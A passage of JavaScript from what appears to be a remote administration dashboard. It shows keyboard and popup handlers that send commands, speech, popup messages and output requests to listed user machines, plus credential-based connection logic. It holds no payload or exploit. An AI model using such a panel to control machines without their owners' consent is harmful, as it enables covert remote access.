            reader.readAsText(file); e.target.value = '';
        };

        $('popup-input').addEventListener('input', () => { runState.cmdLoadedFromUpload = false; updateOptionsUI(); });

        // Keyboard shortcuts
        document.addEventListener('keydown', e => {
            if (!runState.popupMode && window.__getCurrentMode() !== 'run') return;
            if (runState.popupMode) {
                if (e.key === 'Escape') closePopup();
                if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); doSendPopup(); }
                return;
            }
            const activeTag = document.activeElement?.tagName;
            if (activeTag === 'INPUT' || activeTag === 'TEXTAREA' || document.activeElement?.isContentEditable) return;

            if (e.key === 'Escape') { clearActiveSelection(); return; }
            const arrowKeys = ['ArrowUp', 'ArrowDown', 'ArrowLeft', 'ArrowRight'];
            if (arrowKeys.includes(e.key)) {
                e.preventDefault();
                const cards = document.querySelectorAll('.user-card'); if (!cards.length) return;
                const computedCols = getComputedStyle(grid).gridTemplateColumns.trim().split(/\s+/).filter(Boolean).length;
                const cols = Math.max(1, computedCols);
                const sorted = getRenderableRows();
                const cur = runState.activeUsername ? sorted.findIndex(u => u.username === runState.activeUsername) : -1;
                let next = cur < 0 ? 0 : cur;
                if (cur >= 0) {
                    if (e.key === 'ArrowRight') next = Math.min(next + 1, cards.length - 1);
                    if (e.key === 'ArrowLeft') next = Math.max(next - 1, 0);
                    if (e.key === 'ArrowDown') next = Math.min(next + cols, cards.length - 1);
                    if (e.key === 'ArrowUp') next = Math.max(next - cols, 0);
                }
                const nextUser = sorted[next];
                if (nextUser) setActiveSelection(nextUser, 'keyboard', { scroll: true });
                return;
            }
            const u = runState.activeUsername ? getRenderableRows().find(u => u.username === runState.activeUsername) : null;
            if (!u) return;
            const alive = getStatus(u) === 'green';
            const key = e.key.toLowerCase();
            if (key === 'c' && alive) openPopup('cmd', u);
            if (key === 's' && alive) { runState.selectedVoice = e.shiftKey ? 'Zira' : 'David'; openPopup('speak', u); }
            if (key === 'a' && alive) openPopup('popup_msg', u);
            if (key === 'v') doViewOutput(u);
        });

        document.addEventListener('click', e => {
            if (runState.popupMode) return;
            if (window.__getCurrentMode() !== 'run') return;
            if (!e.target.closest('.user-card')) clearActiveSelection();
        });

        // Initial connection
        if (!runState.password) {
            const ok = promptAllCredentials();
            if (!ok) { renderGrid(); }
            else {
                $('user-grid').innerHTML = '<div class="empty">Connecting...</div>';
                connectWithCredentials({ notifyOnFail: false }).then(ok => { if (!ok) renderGrid(); });
            }
        } else {
            $('user-grid').innerHTML = '<div class="empty">Connecting...</div>';
            connectWithCredentials({ notifyOnFail: false }).then(ok => { if (!ok) renderGrid(); });
        }

        $('popup-cancel').onclick = closePopup;
        $('popup-confirm').onclick = doSendPopup;

        // Tab hint / autofill
        const taInput = $('popup-input');
        ['focus', 'blur', 'input'].forEach(evt => taInput.addEventListener(evt, syncTabHint));
        $('tab-autofill-hint').addEventListener('mousedown', e => e.preventDefault());
        $('tab-unfocus-hint').addEventListener('mousedown', e => e.preventDefault());
        $('tab-autofill-hint').addEventListener('click', () => { taInput.focus(); autofillPopupInput(); });
        $('tab-unfocus-hint').addEventListener('click', unfocusPopupInput);
        taInput.addEventListener('keydown', e => {
            if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
                e.preventDefault();
                e.stopPropagation();
                if (e.repeat) return;
                doSendPopup();
            }
            if (e.key === 'Tab') {
                e.preventDefault();
                if (e.shiftKey) unfocusPopupInput();
                else if (taInput.value === '') autofillPopupInput();
                else {
                    const s = taInput.selectionStart, end = taInput.selectionEnd;
                    taInput.value = taInput.value.slice(0, s) + '    ' + taInput.value.slice(end);
                    taInput.selectionStart = taInput.selectionEnd = s + 4;
                }
            }
        });
    }

    return { init };
})();

document.addEventListener('DOMContentLoaded', () => { RunApp.init(); });